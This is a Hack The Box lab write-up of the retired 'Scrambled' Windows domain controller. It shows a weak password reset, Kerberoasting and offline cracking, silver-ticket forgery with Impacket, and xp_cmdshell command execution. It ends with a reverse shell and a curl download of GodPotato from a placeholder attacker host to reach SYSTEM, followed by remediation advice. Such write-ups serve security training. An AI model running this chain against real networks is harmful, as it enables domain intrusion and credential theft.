---
title: "Scrambled — Weak Password Reset and Kerberos Ticket Forgery in Active Directory"
description: "A weak password reset enables Kerberoasting and silver-ticket forgery, then SeImpersonate abuse escalates to SYSTEM via GodPotato."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - kerberos
  - silver-ticket
  - privilege-escalation
---

## Summary

Scrambled is a Medium-rated Hack The Box Windows lab that demonstrates how a weak password‑reset mechanism on an IIS intranet portal can lead to full domain compromise. The recorded chain starts with a password reset that sets a user’s password to their username, uses the recovered credentials to Kerberoast a service account with a weak password, forges a silver ticket against MSSQL, executes commands via `xp_cmdshell`, and escalates to SYSTEM via GodPotato exploiting `SeImpersonatePrivilege`. Every step abuses legitimate functionality that was misconfigured. Credential values, target addresses, and download locations are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Windows Server 2019 (build 17763), Active Directory Domain Controller (`<DC_FQDN>`)
- **Services exposed:** DNS (port 53), HTTP/IIS (port 80), Kerberos (port 88), LDAP (389/636/3268/3269), MSSQL (port 1433), WinRM (port 5985), custom API (port 4411)
- **Objective:** Achieve full compromise through the attack surface presented by the exposed services
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Service Enumeration

Observation: multiple open TCP services with distinct attack surfaces. Standard AD ports indicate a Domain Controller. IIS hosts an intranet portal. MSSQL is exposed. A custom API service is present.

Action: full TCP scan, then targeted version/script scan of ports 80, 88, 389, 445, 1433, 5985.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Scrambled-TCP
```

Representative excerpt (truncated):

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Technical significance: the host is an AD Domain Controller (<DC_FQDN>). IIS serves an intranet portal. MSSQL is exposed. WinRM is available. The custom API on port 4411 is noted but not used in the recorded chain.

Result: the recorded output shows AD services, IIS intranet, and MSSQL exposed on a Windows Server 2019 DC.

### 2. Web Service Discovery and Password Reset

Observation: directory enumeration on the IIS server reveals `/passwords.html` and `/supportrequest.html`. The `/passwords.html` page states a password reset feature: reset any user’s password to their username.

Action: directory enumeration, then submit a username to trigger reset.

```bash
feroxbuster --url http://<DOMAIN> --wordlist <COMMON_WORDLIST>
```

```text
http://<TARGET_IP>/passwords.html
http://<TARGET_IP>/supportrequest.html
```

```text
leave a message stating your username and we will reset your password to be the same as the username.
```

Submitting the username `<LAB_USER>` via the support form resets the password to `<LAB_USER>` (source-reported success).

Result: the notes report valid domain credentials recovered via the weak reset mechanism.

### 3. SMB Access and Credential Validation

Observation: reset credentials fit SMB authentication.

Action: validate credentials against SMB.

```bash
nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER>' --shares -k
```

```text
SMB         <TARGET_IP>    445    DC1              [+] <DOMAIN>\<LAB_USER>:<LAB_USER>
```

Authentication succeeds. The `Public` SMB share is accessible and contains a PDF document (`Network Security Changes.pdf`). Domain information is collected with RustHound for AD mapping.

```bash
rusthound-ce --domain <DOMAIN> -u '<LAB_USER>' -p '<LAB_USER>' --zip -o <DOMAIN>
```

Result: the notes report domain user access and successful collection of AD data.

### 4. Kerberoasting Service Account

Observation: Kerberoasting extracts service account ticket hashes from the domain.

Action: Kerberoast the `sqlsvc` service account.

```bash
nxc smb <TARGET_IP> -u '<LAB_USER>' -p '<LAB_USER>' -k --kerberoasting out.txt
```

```text
SAM Account Name:
sqlsvc
Service Principal Names:
MSSQLSvc/dc1.<DOMAIN>:1433
MSSQLSvc/dc1.<DOMAIN>
```

The extracted TGS hash is cracked offline with rockyou:

```bash
hashcat out.txt /wordlists/rockyou.txt -D2
```

```text
:<WEAK_PASSWORD>
```

Technical significance: the service account password is weak and found in a common wordlist. The cracked password enables NTLM hash computation for ticket forgery.

Result: the notes report the service account password cracked from a Kerberos TGS hash.

### 5. Silver Ticket Forgery and MSSQL Access

Observation: NTLM hash computed from cracked password enables Kerberos ticket forgery.

Action: compute NTLM hash, forge silver ticket against MSSQL service, impersonate `Administrator`.

```bash
python3 -c "from Cryptodome.Hash import MD4;h=MD4.new();h.update('<WEAK_PASSWORD>'.encode('utf-16le'));print(h.hexdigest())"
```

```text
<NTLM_HASH>
```

```bash
impacket-ticketer -nthash '<NTLM_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/dc1.<DOMAIN>' 'Administrator'
```

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-mssqlclient -k <DC_FQDN>
```

Inside the SQL session, `xp_cmdshell` is enabled for OS command execution:

```sql
enable_xp_cmdshell
```

Technical significance: silver ticket forgery grants administrative access to SQL Server without needing the domain controller’s KRBTGT hash. `xp_cmdshell` provides direct OS command execution.

Result: the notes report administrative database access via forged Kerberos ticket.

### 6. Privilege Escalation via SeImpersonate Abuse

Observation: MSSQL service account holds `SeImpersonatePrivilege`, making it vulnerable to potato‑style privilege escalation.

Action: start listener, deliver reverse shell via `xp_cmdshell`, escalate with GodPotato.

```bash
rlwrap nc -lvnp <LISTEN_PORT>
```

```sql
xp_cmdshell powershell -enc <BASE64_PAYLOAD>
```

Inspect current user’s privileges:

```text
whoami /all
```

```text
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Download and execute GodPotato:

```bash
curl -o asd.exe http://<ATTACKER>/csharp-files/GodPotato-NET4.exe
```

```bash
./asd.exe -cmd "powershell -enc <BASE64_PAYLOAD>"
```

```text
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1228
nt authority\system
```

Confirm SYSTEM access:

```bash
whoami /all
```

```text
User Name           SID
=================== ========
nt authority\system S-1-5-18
```

Technical significance: GodPotato exploits the `SeImpersonatePrivilege` held by the MSSQL service account to spawn a process as `SYSTEM`. The root flag is accessible on the Administrator desktop.

Result: the notes report SYSTEM access and root flag acquisition (flag content omitted).

## Challenges and Decisions

| Challenge | Decision | Rationale |
|---|---|---|
| Weak password reset mechanism | Used support form to reset user password to username | No verification required; provided initial domain credentials |
| Kerberoastable service account with weak password | Kerberoasted `sqlsvc` and cracked offline | Weak password found in rockyou wordlist |
| Silver ticket forgery against MSSQL | Forged ticket impersonating `Administrator` | Provided administrative database access without KRBTGT hash |
| SeImpersonate privilege on MSSQL service account | Used GodPotato to escalate to SYSTEM | Standard potato-style escalation for service accounts with SeImpersonate |

## Outcome

The evidence establishes: user-level access via weak password reset; service account credential recovery via Kerberoasting; administrative database access via silver ticket forgery; SYSTEM-level code execution via SeImpersonate abuse. Reverse-shell establishment, GodPotato execution, and flag acquisition are source-reported with the limitations noted above. The custom API on port 4411 played no role in the recorded chain.

**Attack chain:**
Weak password reset → SMB validation → Kerberoasting → silver ticket forgery → MSSQL xp_cmdshell → SeImpersonate abuse → SYSTEM

## Lessons and Recommendations

Recommendations below follow the source remediation; none were re-tested during curation.

1. **Require verification for password resets.** Never reset passwords to usernames without email or secondary confirmation. Enforce password complexity on newly reset credentials. (Recommendation.)
2. **Use strong, randomly generated passwords for service accounts.** Migrate to Group Managed Service Accounts (gMSAs) to eliminate password‑based authentication. (Recommendation.)
3. **Disable RC4 encryption for Kerberos tickets.** Enable Kerberos Armoring (FAST) and monitor for anomalous TGS requests (event ID 4769). (Recommendation.)
4. **Run MSSQL under a low‑privileged virtual account or Managed Service Account.** Apply security updates that mitigate potato‑type privilege escalation techniques. (Recommendation.)
5. **Audit service account permissions.** Limit database administrator privileges to only those accounts that require them. (Lesson grounded in this chain.)

Editorial MITRE view (mapping only, not a source claim): weak password reset, Kerberoasting, silver ticket forgery, xp_cmdshell abuse, SeImpersonate privilege escalation.

## References

- Hack The Box machine **[Scrambled](https://app.hackthebox.com/machines/Scrambled)** (retired lab; no active-instance detail)
- Microsoft documentation: Windows Kerberos and silver ticket features
- Impacket toolkit for Kerberos ticket manipulation and MSSQL interaction
- GodPotato privilege escalation tool for SeImpersonate abuse